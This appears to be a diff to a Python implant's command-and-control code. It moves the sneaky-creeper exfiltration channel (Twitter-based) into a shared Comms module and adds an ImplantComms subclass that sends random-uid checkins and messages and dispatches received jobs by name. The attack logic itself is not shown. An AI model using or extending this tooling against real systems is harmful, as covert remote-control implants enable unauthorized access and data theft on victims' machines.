@@ -6,32 +6,13 @@ import string
 import random
 from time import sleep
 
-# put sneaky-creeper on the path, then import it
-basePath = os.path.dirname(os.path.realpath(__file__))
-sys.path.append(os.path.join(basePath, 'sneaky-creeper'))
-from sneakers import Exfil
+from comms import Comms
 
-channel = "twitter"
-encoders = []
+from params import *
 
-channelParams = {'sending': {
-                 },
-
-                 'receiving': {
-                 }
-                }
-
-encoderParams = {}
-
-class Comms:
-    """ Encapsulates all of the methods and data needed to communicate
-        with the outside world """
-
+class ImplantComms(Comms):
     def __init__(self, channel, encoders, channelParams, encoderParams):
-        self.channel = channel
-        self.encoders = encoders
-        self.channelParams = channelParams
-        self.encoderParams = encoderParams
+        super(ImplantComms, self).__init__(channel, encoders, channelParams, encoderParams)
 
         # actual sleep time will be randomly chosen between the following two
         self.minSleepTime = 1 # minimum seconds to sleep between checkins
@@ -40,26 +21,13 @@ class Comms:
         # generate a uid for ourselves
         self.uid = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(20)])
 
-        # this sets a self.feed attribute
-        self.setUpFeed()
-
-    def setUpFeed(self):
-        """ Set up the sneaky-creeper comms channel object """
-
-        feed = Exfil(channel, encoders)
-        feed.set_channel_params(self.channelParams)
-        for enc, params in self.encoderParams.items():
-            feed.set_encoder_params(enc, params)
-
-        self.feed = feed
-
     def sendCheckin(self):
         """ sends a checkin packet on the feed """
-        self.feed.send("{}:checkin".format(self.uid))
+        self.send("{}:checkin".format(self.uid))
 
     def sendMessage(self, msg):
         """ sends a generic 'message' packet on the feed """
-        self.feed.send("{}:message:{}".format(self.uid, msg))
+        self.send("{}:message:{}".format(self.uid, msg))
 
     def setSleep(self, minSleep, maxSleep):
         """ sets the amount of time to sleep between checkins """
@@ -123,9 +91,10 @@ class Jobs:
             getattr(self, jobName)(cmdString)
             # TODO in a thread
 
+
 if __name__ == "__main__":
     # set up our comms channel
-    comms = Comms(channel, encoders, channelParams, encoderParams)
+    comms = ImplantComms(channel, encoders, channelParams, encoderParams)
 
     # set up our jobs handler
     jobs = Jobs(comms)
